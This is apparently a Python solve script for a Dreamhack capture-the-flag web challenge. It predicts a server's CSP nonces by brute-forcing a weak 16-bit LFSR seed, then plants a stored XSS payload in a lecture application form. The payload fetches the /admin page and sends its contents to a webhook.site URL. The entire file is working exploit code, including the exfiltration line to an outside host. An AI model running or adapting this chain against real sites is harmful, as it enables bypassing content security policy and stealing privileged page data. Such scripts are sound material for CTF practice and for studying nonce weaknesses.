import requests
import re

url = 'http://host8.dreamhack.games:16181/'
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/sign_up', data=creds)
res = s.post(f'{url}/sign_in', data=creds)

assert '/lecture' in res.text.lower()
print("> Logged in")

# get 2 known nonces
def get_nonce():
    res = s.get(f'{url}/garbage')
    
    return re.findall(r"'nonce-(.+?)'", str(res.headers))[0].strip()

nonce1 = get_nonce()
nonce2 = get_nonce()

print("> Nonces:", nonce1, nonce2)

# recover lfsr seed
CONST = 0xbeefbeefcafecafe13371337defaced0

def lfsr(seed):
    fb = (seed ^ (seed >> 2) ^ (seed >> 3) ^ (seed >> 5)) & 1
    return ((seed >> 1) | (fb << 15)) & 0xFFFF

def rand32(seed):
    out = 0
    for i in range(32):
        out |= (seed & 1) << i
        seed = lfsr(seed)
    return out, seed

def nonce(seed):
    n = 0
    for i in range(4):
        r, seed = rand32(seed)
        n |= r << (32 * i)
    return n ^ CONST, seed

def get_seed(n2, n3):
    n2 = int(n2, 16)
    n3 = int(n3, 16)

    for s in range(1, 0x10000):
        seed = s

        n, seed = nonce(seed)
        if n != n2:
            continue

        n, seed = nonce(seed)
        if n == n3:
            print("[+] recovered initial seed:", s)
            print("[+] current state:", seed)
            return seed

    raise Exception("not found")

seed = get_seed(nonce1, nonce2)

future, seed = nonce(seed)
future_nonce = hex(future)[2:]

print("> Seed:", seed)
print("> Nonce:", future, future_nonce)

# xss
webhook = 'https://webhook.site/9e00eff2-560c-4ba9-a005-703f0f669088'

payload = """
<script nonce='%s'>
fetch('/admin').then(r=>r.text()).then(d=>location.href=`%s?e=${d}`)
</script>
""".strip().replace("\n", '') % (future_nonce, webhook)

res = s.post(f'{url}/apply_lecture', data={
    'lecture_id': 1,
    'applicant_name': 'a',
    'email': '@',
    'contact': '-',
    'reason': payload
}, allow_redirects=False)

assert 'applied success' in res.text.lower()
print("> Payload submitted")